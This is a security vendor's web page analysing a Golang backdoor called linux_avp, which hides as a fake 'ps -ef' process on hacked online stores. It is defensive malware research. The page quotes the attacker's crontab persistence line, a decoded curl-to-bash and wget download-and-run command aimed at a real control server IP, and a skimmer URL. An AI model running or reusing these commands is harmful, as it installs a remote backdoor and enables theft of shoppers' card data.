<!DOCTYPE html><html lang="en" class="no-transition promotion-enabled" translate="no"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><meta http-equiv="X-UA-Compatible" content="ie=edge"><meta property="og:locale" content="en_US"><meta property="og:title" content="New linux_avp malware hits eCommerce sites &ndash; Sansec"><meta name="author" content="Sansec Team"><meta property="og:url" content="https://sansec.io/research/ecommerce-malware-linux-avp"><meta property="og:site_name" content="Sansec"><meta property="og:image" content="https://sansec.io/assets/posts/cache/6528c459acc4ac5ad80f4892edf95d9a.png"><meta property="og:type" content="article"><meta property="article:published_time" content="2021-11-18T00:00:00+01:00"><meta property="article:author" content="https://www.twitter.com/sansecio"><meta name="description" content="A new server-side Magecart malware was found. It is called linux_avp and hides as a fake ‘ps -ef’ process on the server.
"><meta property="og:description" content="A new server-side Magecart malware was found. It is called linux_avp and hides as a fake ‘ps -ef’ process on the server.
"><meta name="twitter:title" content="New linux_avp malware hits eCommerce sites"><meta name="twitter:image" content="https://sansec.io/assets/posts/cache/6528c459acc4ac5ad80f4892edf95d9a.png"><meta name="twitter:description" content="A new server-side Magecart malware was found. It is called linux_avp and hides as a fake ‘ps -ef’ process on the server.
"><meta name="twitter:site" content="@sansecio"><meta name="twitter:card" content=" summary_large_image"><link rel="icon" href="/assets/images/favicon.ico" type="image/x-icon"><link rel="stylesheet" href="/assets/css/main.css?52229e3"><link rel="canonical" href="https://sansec.io/research/ecommerce-malware-linux-avp"><link type="text/plain" rel="author" href="/humans.txt"><link rel="alternate" type="application/atom+xml" title="Sansec &ndash; Secure stores, happy shoppers" href="/atom.xml"><script>!function(e,t,a,n){e[n]=e[n]||[],e[n].push({"gtm.start":(new Date).getTime(),event:"gtm.js"});var g=t.getElementsByTagName(a)[0],m=t.createElement(a);m.async=!0,m.src="https://www.googletagmanager.com/gtm.js?id=GTM-W4VK6TQ",g.parentNode.insertBefore(m,g)}(window,document,"script","dataLayer")</script><script type="text/javascript">window._mfq=window._mfq||[],function(){var e=document.createElement("script");e.type="text/javascript",e.async=!0,e.src="//cdn.mouseflow.com/projects/b8b33745-29ba-4a8d-8a21-4019ba29e934.js",document.getElementsByTagName("head")[0].appendChild(e)}()</script><title>New linux_avp malware hits eCommerce sites &ndash; Sansec</title><script type="application/ld+json">{
      "@context": "https://schema.org",
      "@type": "Organization",
      "url": "https://sansec.io",
      "logo": "https://sansec.io/assets/posts/sansec-1107x208.png"
    }</script><script>var Sansec={menu:[{name:"Product",link:"/ecomscan"},{name:"Pricing",link:"/pricing"},{name:"Resources",sub:[{name:"News",link:"/news"},{name:"Research",link:"/research"},{name:"Partners",link:"/partners"},{name:"Support",link:"/support"}]},{type:"spacer"},{name:"Company",link:"/company"},{name:"Contact",link:"/contact"}]}</script><script type="application/ld+json">{
    "description": "A new server-side Magecart malware was found. It is called linux_avp and hides as a fake ‘ps -ef’ process on the server.
",
    "author": { "@type": "Person", "name": "Sansec Team" },
    "@type": "BlogPosting",
    "url": "canon_url",
    "image": "/assets/posts/cache/6528c459acc4ac5ad80f4892edf95d9a.png",
    "headline": "New linux_avp malware hits eCommerce sites",
    "dateModified": "2021-12-16T22:56:02+01:00",
    "datePublished": "2021-11-18T00:00:00+01:00",
    "mainEntityOfPage": {
      "@type": "WebPage",
      "@id": "https://sansec.io/research/ecommerce-malware-linux-avp"
    },
    "@context": "https://schema.org"
  }</script></head><body><noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-W4VK6TQ" height="0" width="0" style="display: none; visibility: hidden;"></iframe></noscript><div class="app"><header><div class="header__promotion__container"><div class="header__promotion__block-wrapper"><div class="header__promotion__block text_bold"><div><a class="link-like_white text_boldest" href="/ecomscan">eComscan</a> secures over 7,000 online stores</div><a class="header__promotion__link" href="/pricing"><ul class="header__promotion__list"><li>30-day money back guarantee</li><li>Easy 5 minute install</li><li>Cancel any time</li></ul></a></div></div></div><div class="header__block__container header__company-logo__container"><a class="company-logo" href="/"><div class="company-logo__img resource resource-logo"></div></a></div><div id="mobile-menu" class="mobile-menu"><div class="col col_mobile-menu"><div class="row mobile-menu__header"><a class="company-logo" href="/"><div class="company-logo__img resource resource-logo"></div></a><div id="mobile-menu__action" class="mobile-menu__action resource has-tap-area"></div></div><ul id="mobile-menu__current-menu" class="col mobile-menu__current-menu"></ul><div class="col mobile-menu__help-block"><a href="/getting-started"><span class="help-text text_underlined no-whitespace">Get started in 5 minutes!</span></a></div></div></div><div class="header__block__container header__navigation__container"><div class="header__navigation__wrapper"><nav><ul class="header__navigation-menu"><li><a class="navigation-menu__link" href="/ecomscan">Product</a></li><li><a class="navigation-menu__link" href="/pricing">Pricing</a></li><li><span id="resources" class="navigation-menu__option has-hover">Resources</span><div class="navigation-menu__submenu-container"><ul class="navigation-menu__submenu" data-menu-for="resources"><li><a href="/news" class="navigation-menu__link">News</a></li><li><a href="/research" class="navigation-menu__link">Research</a></li><li><a href="/partners" class="navigation-menu__link">Partners</a></li><li><a href="/support" class="navigation-menu__link">Support</a></li></ul></div></li><li class="navigation-menu__spacer"></li><li><a class="navigation-menu__link" href="/company">Company</a></li><li><a class="navigation-menu__link" href="/contact">Contact</a></li></ul></nav></div></div><div id="menu" class="has-tap-area"><svg class="hamburger" viewBox="0 0 24 18" xmlns="http://www.w3.org/2000/svg"><g stroke="#1d2227" stroke-width="2"><path d="m0 1h24"></path><path d="m0 9h24"></path><path d="m0 17h24"></path></g></svg></div><div class="header__block__container header__help__container visible-sm"><div class="header__help"><div class="help-cell help-cell-1"><span class="help-text help-text text_underlined no-whitespace">Get started in 5 minutes!</span></div><div class="help-cell help-cell-2"><a href="/getting-started#pricing" class="help-text">Secure your store today.<br><span class="help-text text_underlined">CLICK HERE</span></a></div></div></div></header><main><section class="hero_simple with-centered-circle centered-circle_small centered-circle-bottom-left_offset"><div class="col container-sm top-xs"><div class="hero__contents hero__contents-simple"><h1>New linux_avp malware hits eCommerce sites</h1></div></div></section><section class="wrapper_sm is-pushed-xs"><div class="col sticky-container"><article class="article"><ul class="article__meta wrapper_sm container-sm"><li class="meta-block meta-block_left"><div class="meta-block__container"><div class="meta-block-breadcrumbs"><p class="meta__date">18th November 2021</p><a href="/research">Web Skimming</a> / Sansec Threat Research</div><div class="article-block has-shadow_slight visible-xxl sticky" data-aos="fade-right" data-aos-offset="50"><h6>Learn about new eCommerce hacks?</h6><p>Receive an alert whenever we discover new hacks or vulnerabilities that may affect your online store.</p><newsletter data-classes="newsletter_article"></newsletter></div></div></li><li class="meta-block_centered"></li><li class="meta-block"><div class="meta-block__container"><div class="article-block has-shadow_slight resource resource-code visible-xxl sticky" data-aos="fade-left"><h5>What is<br>Magecart?</h5><p>Also known as digital skimming, this crime has surged since 2015. Criminals steal card data during online shopping. Who are behind these notorious hacks, how does it work, and how have Magecart attacks evolved over time?</p><a class="button" href="/what-is-magecart">About Magecart</a></div></div></li></ul><div class="article__contents container-sm"><div class="article__image article__headline-image"><img src="/assets/posts/cache/6528c459acc4ac5ad80f4892edf95d9a.png" alt="New linux_avp malware hits eCommerce sites"></div><div class="article__content"><p><strong>Sansec discovered a new malicious agent “linux_avp” that hides as system process on eCommerce servers. It is being deployed around the world since last week and takes commands from a control server in Beijing.</strong></p><p>A merchant recently reached out to us, after hiring two forensic companies but still having malware on his store. As we appreciate a challenge, our team got started and quickly discovered an intricate attack.</p><h2 id="malicious-golang-server-agent">Malicious Golang server agent</h2><p>We found that the attacker started with automated eCommerce attack probes, testing for dozens of weaknesses in common online store platforms. After a day and a half, the attacker found a file upload vulnerability in one of the store’s plugins. S/he then uploaded a webshell and modified the server code to intercept customer data.</p><p>Interestingly, the attacker also uploaded a Linux executable called <code class="highlighter-rouge">linux_avp</code>. This Golang program starts, removes itself from disk, and disguises as a fake <code class="highlighter-rouge">ps -ef</code> process.</p><p>Analysis of <code class="highlighter-rouge">linux_avp</code> suggests that it serves as backdoor, waiting for commands from a Beijing (Alibaba) hosted server <code class="highlighter-rouge">47.113.202.35</code>. Note the spelling error <code class="highlighter-rouge">PostDecript</code> in the malware function list:</p><div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>main.BytesToPublicKey
main.(*client).getJob
main.(*client).getJob.func1
main.(*client).MakeCryptPostData
main.(*client).PostDecript
main.(*client).postRequest
main.(*client).register_cli
main.(*client).returnHash
main.CorrectPub64
main.DecryptOAEP
main.DecryptOAEPLong
main.DownloadFile
main.EncryptOAEP
main.EncryptOAEPLong
main.execute
main.GenerateKeyPair
main.JsonToDict
main.map2json
main.newClient
main.PubFrom64
main.PublicKeyToBytes
main.PublicKeyToStr
main.SetProcessName
main.wsock
</code></pre></div></div><p>The backdoor also revealed where the backdoor was built: by user <code class="highlighter-rouge">dob</code> in a project folder <code class="highlighter-rouge">lin_avp</code>, using code name <code class="highlighter-rouge">GREECE</code>.</p><div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/home/dob/Documents/GREECE/lin_avp/lin_avp.go
/home/dob/Documents/GREECE/lin_avp/rsa_pac.go
/home/dob/Documents/GREECE/lin_avp/websock_pac.go
</code></pre></div></div><p>The <code class="highlighter-rouge">linux_avp</code> malware also injects a malicious crontab entry, to ensure access in case that the process is removed or the server rebooted.</p><div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>* * * * * /bin/bash -c "base64 --decode &lt;&lt;&lt; Y3VybCAtWCBQT1NUIC1kICJoYXNoPTNjMjM1YTJjY2Q3ZGI3Mzk3ZDMyNGI4ZjhiZTBlZGJhIiAtLWluc2VjdXJlIGh0dHBzOi8vNDcuMTEzLjIwMi4zNS9saWNlbnNlX3ZhbGlkYXRpb25fZXhwaXJhdGlvbiB8IGJhc2U2NCAtLWRlY29kZSB8IC9iaW4vYmFzaA== | /bin/bash"
</code></pre></div></div><p>This translates to :</p><div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl -X POST -d "hash=f6ee7f366f96456277fd9e10c07d9d3f" --insecure https://47.113.202.35/license_validation_expiration | base64 --decode | /bin/bash
</code></pre></div></div><p>When executed, it will receive this code:</p><div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>path_wr=$(find / -type d -writable -print | grep -wv '^/proc\|^/dev\|^/run' -m1);wget -O $path_wr/linux_avp --post-data 'hash=f6ee7f366f96456277fd9e10c07d9d3f' https://47.113.202.35/license_validation --no-check-certificate;chmod +x $path_wr/linux_avp;echo 'LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlJQktEQU5CZ2txaGtpRzl3MEJBUUVGQUFPQ0FSVUFNSUlCRUFLQ0FRY0E4S3ppZ0hEbkhrd3VMRlFiam14MgpSd25iME1xK1RQT1JsWlA1NXZON2xZWHh6clVhV2lUMWthdWc2K09TTjZUVUFmaDBhNTBmYUZnUmhOSXFiYkdrCnB1TURmTzN3N0NWWFVsekRCMDVVREdpRzJqdEJQVU54Y3lET3c2di9RNUpoT0FsUjZ1eHlqZ3BnRndjdTZYSHYKUlMzT0kzTzE5Y0ZyejZWanJXOENUSktTTjhjeVRrTWlMQ2o1MTN1SVA3WEIwM0R3M1NkS3d1RExEeXRlUlJtSQpPWWtnZHJkZk52TVFQa0JwQnNVZWgwVzZ3S3VJeWpNZmVHUjBwUE0vVkxOeUwyWWhJdk05SXZRSUZsSzBNdWpUCjhMQ0gzejNweTluWjBCbUxTZ3B6MUxONC81SUlMQldpK1dTdnAvbmFLbWk1NE5xWkwyWTQvTkVlU1Y5MXpHcC8KR3hxdDJhWEFYUUlEQVFBQgotLS0tLUVORCBQVUJMSUMgS0VZLS0tLS0K' &gt; $path_wr/xpnjdfx.txt;echo "anonymous" &gt; drgjghsaef.txt; $path_wr/linux_avp &amp;
</code></pre></div></div><p>This effectively downloads the Golang malware executable to a random writable directory, and installs two configuration files. One contains a public key, which is presumably used to ensure that no-one but the malware owner can launch commands.</p><div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>-----BEGIN PUBLIC KEY-----
MIIBKDANBgkqhkiG9w0BAQEFAAOCARUAMIIBEAKCAQcA8KzigHDnHkwuLFQbjmx2
Rwnb0Mq+TPORlZP55vN7lYXxzrUaWiT1kaug6+OSN6TUAfh0a50faFgRhNIqbbGk
puMDfO3w7CVXUlzDB05UDGiG2jtBPUNxcyDOw6v/Q5JhOAlR6uxyjgpgFwcu6XHv
RS3OI3O19cFrz6VjrW8CTJKSN8cyTkMiLCj513uIP7XB03Dw3SdKwuDLDyteRRmI
OYkgdrdfNvMQPkBpBsUeh0W6wKuIyjMfeGR0pPM/VLNyL2YhIvM9IvQIFlK0MujT
8LCH3z3py9nZ0BmLSgpz1LN4/5IILBWi+WSvp/naKmi54NqZL2Y4/NEeSV91zGp/
Gxqt2aXAXQIDAQAB
-----END PUBLIC KEY-----
</code></pre></div></div><p>This case has another Chinese connection. A file was added to the eCommerce platform code called <code class="highlighter-rouge">app/design/frontend/favicon_absolute_top.jpg</code>, which contains PHP code to retrieve a fake payment form and inject it in the store:</p><div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://103.233.11.28/jQuery_StXlFiisxCDN.php?hash=06d08a204bddfebe2858408a62c742e944824164
</code></pre></div></div><p>The IP <code class="highlighter-rouge">103.233.11.28</code> is hosted in Hong Kong and we previously observed it as skimming exfiltration endpoint in July and August of this year.</p><h2 id="malware-under-the-radar-but-spreading">Malware under the radar but spreading</h2><p></p><div class="article__image"><img class="lazy" data-src="/assets/posts/cache/a0e2ec70b71267bc04ce954cef5a9052.png" alt=""></div><p></p><p>At the time of writing, <a href="https://www.virustotal.com/gui/file/2d422affb9727b71b0e1610568bea8643892d99bdaed99269a10e7554c88437b/detection">no other anti-virus vendor</a> recognize this malware. Curiously, one individual <a href="https://www.virustotal.com/gui/file/2d422affb9727b71b0e1610568bea8643892d99bdaed99269a10e7554c88437b/details">had submitted</a> the same malware to Virustotal on Oct 8th with the comment “test”. This was just one day after the successful breach of our customer’s store. The person uploading the malware could very well be the malware author, who wanted to assert that common anti-virus engines will not detect their creation.</p><p>Sansec has updated detection capabilities for our eComscan security monitor, and the malware was discovered on several US and EU based servers.</p><p><strong>Update 2021-11-25:</strong> see also our analysis of another, more advanced RAT we found a few days later: <a href="/research/cronrat">CronRAT</a>.</p><p><em>Photo by: <a href="https://twitter.com/jeremybezanger">Jeremy Bezanger</a></em></p></div><div><a class="twitter-follow-button" href="https://twitter.com/sansecio">data-size="large" > Follow @sansecio</a></div></div></article></div></section><section class="bg_grey"><div class="wrapper_card container-sm pull-me-up-xs"><div class="col action-card has-shadow_slight with-centered-circle centered-circle_small centered-circle-bottom-left centered-circle_yellow" data-aos="fade-up"><div class="col action-card__contents"><h5>Stay ahead of eCommerce hacks,<br>protect your store today!</h5><p>Sansec forensic experts were the first to document large scale digital skimming in 2015. Since then, we have investigated thousands of hacked stores. Our research of the latest attack vectors protects our customers around the world. Our anti-skimming technology and data are used by merchants, forensic investigators, financial anti-fraud teams and service providers</p><a class="button action-card__button" href="/ecomscan">Try our malware scanner</a></div></div></div></section></main><footer class="with-centered-circle centered-circle_bottom-to-right centered-circle_yellow"><script type="text/javascript"></script><div class="footer__contents"><div class="footer__top row top-xs space-between-xs"><div class="footer__top__block visible-sm"><span class="footer__top__block__title">Made with <span class="icon_green">❤</span> in Europe</span><ul class="footer__address"><li>Sansec BV</li><li>Europalaan 20</li><li>3526 KS Utrecht</li><li>The Netherlands</li><li><a href="/cdn-cgi/l/email-protection#f49d9a929bb487959a879197da9d9b"><span class="__cf_email__" data-cfemail="2b42454d446b584a45584e48054244">[email&#160;protected]</span></a></li></ul></div><div class="footer__top__block visible-sm"><ul class="footer__links__list"><li><a href="/ecomscan">Product</a></li><li><a href="/pricing">Pricing</a></li><li><a href="/support">Support</a></li><li><a href="/partners">Partners</a></li><li><a href="/magento-usage-data">Magento Stats</a></li><li><a href="/malware">Malware Library</a></li><li><a href="/research/cardbleed">Cardbleed</a></li></ul></div><div class="footer__top__block visible-sm"><ul class="footer__links__list"><li><a href="/research">Research</a></li><li><a href="/news">News</a></li><li><a href="/company">Company</a></li><li><a href="/contact">Contact</a></li><li><a href="#" data-cb-type="portal" class="footer__login">Log in</a></li></ul></div><div class="footer__top__block"><div class="stay-informed"><div class="stay-informed__title">Stay up to date with the latest eCommerce attacks</div><newsletter data-classes="newsletter_footer"></newsletter></div></div></div><div class="footer__company"><div class="col row-sm middle-xs space-between-sm baseline-sm"><div class="company-logo"><div class="company-logo__img resource resource-logo_white"></div></div><div class="motto">Secure stores, happy shoppers</div></div><div class="footer__separator"></div><div class="col row-sm middle-sm space-between-sm"><div class="footer__social_networks"><a class="resource resource-twitter" href="https://twitter.com/sansecio" target="_blank"></a> <a class="resource resource-linkedin" href="https://www.linkedin.com/company/sansec/" target="_blank"></a> <a class="resource resource-mail" href="/cdn-cgi/l/email-protection#5f363139301f2c3e312c3a3c713630"></a></div><div class="footer__terms"><div class="footer__terms__item"><a class="footer__terms__link has-tap-area tap-area_sm" href="/downloads/sansec_tc.pdf">Terms & Conditions</a><div class="footer__terms__separator">|</div><a class="footer__terms__link has-tap-area tap-area_sm" href="/downloads/sansec_pcp.pdf">Privacy & Cookie Policy</a><div class="footer__terms__separator visible-sm">|</div></div><div class="footer__terms__item"><span>Company Reg 77165187</span><div class="footer__terms__separator">|</div><span>Tax NL860920306B01</span></div></div></div></div></div></footer></div><script data-cfasync="false" src="/cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script><script async src="/assets/js/main.js?52229e3"></script><script src="https://js.chargebee.com/v2/chargebee.js" data-cb-site="sansec"></script><script async src="/assets/js/sticky.js?52229e3"></script><script async src="/assets/js/newsletter.js?52229e3" type="text/javascript" charset="utf-8"></script><script>!function(e,t,n,i,a,c){e.twq||((i=e.twq=function(){i.exe?i.exe.apply(i,arguments):i.queue.push(arguments)}).version="1.1",i.queue=[],(a=t.createElement(n)).async=!0,a.src="//static.ads-twitter.com/uwt.js",(c=t.getElementsByTagName(n)[0]).parentNode.insertBefore(a,c))}(window,document,"script"),twq("init","o54o6"),twq("track","PageView")</script><script type="text/javascript">_linkedin_partner_id="3076097",window._linkedin_data_partner_ids=window._linkedin_data_partner_ids||[],window._linkedin_data_partner_ids.push(_linkedin_partner_id)</script><script type="text/javascript">!function(){var t=document.getElementsByTagName("script")[0],e=document.createElement("script");e.type="text/javascript",e.async=!0,e.src="https://snap.licdn.com/li.lms-analytics/insight.min.js",t.parentNode.insertBefore(e,t)}()</script><noscript><img height="1" width="1" style="display: none" alt="" src="https://px.ads.linkedin.com/collect/?pid=3076097&fmt=gif"></noscript><script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script></body></html>